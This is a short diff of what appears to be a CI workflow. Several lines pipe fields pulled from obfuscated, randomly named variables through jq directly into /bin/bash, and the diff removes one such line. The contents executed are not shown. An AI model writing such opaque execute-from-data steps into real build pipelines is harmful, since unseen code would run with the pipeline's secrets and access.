@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$sr9" | jq -r .s05776 | /bin/bash
           echo $qhmb193 | jq -r .ne49911 | /bin/bash
           printf '%s' "$ma3282" | jq -r .e92089 | /bin/bash
-          echo $kl3 | jq -r .zs454 | /bin/bash
           echo $j903 | jq -r .qdeo78731 | /bin/bash
 
       - name: Save results
